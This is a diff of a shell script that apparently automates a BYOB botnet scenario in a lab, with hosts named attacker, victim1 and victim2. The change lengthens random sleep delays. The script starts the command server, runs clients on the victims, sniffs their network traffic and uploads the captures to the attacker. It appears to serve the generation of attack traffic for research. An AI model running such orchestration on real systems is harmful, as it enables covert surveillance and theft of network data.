@@ -4,23 +4,23 @@ remote_kill() {
     node=$1
     prog=$2
     ssh $node "sudo kill \$(ps -e | grep $prog | awk '{print \$1}')"
-    sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+    sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 }
 
 
 
 ssh attacker "cd ~/byob && ./server.py --background" &
-sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 attackerPid=$1
 
 sleep 10 # let the server boot
 
 ssh victim1 "sudo byob-client" &
-sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 victimPid=$!
 
 ssh victim2 "sudo byob-client" &
-sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 victimPid=$!
 
 
@@ -28,39 +28,39 @@ sleep 5 # let the victim connect
 
 
 ssh attacker "byossh victim1 packetsniffer run"
-sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 sleep 2
 
 ssh attacker "byossh victim2 packetsniffer run"
-sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 sleep 8
 
 ssh attacker "byossh victim1 packetsniffer upload"
-sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 ssh attacker "byossh victim2 packetsniffer upload"
-sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 sleep 5
 
 
 # Kill byob on client via byob
 ssh attacker "byossh victim1 sudo kill \$(ps -e | grep python | awk '{print \$1}')"
-sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 ssh attacker "byossh victim1 sudo kill \$(ps -e | grep byob | awk '{print \$1}')"
-sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 ssh attacker "byossh victim2 sudo kill \$(ps -e | grep python | awk '{print \$1}')"
-sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 ssh attacker "byossh victim2 sudo kill \$(ps -e | grep byob | awk '{print \$1}')"
-sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 # Kill byob server on attacker
 remote_kill attacker server
-sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 remote_kill attacker python
-sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 sleep 8 # Make sure all the data downloads
 
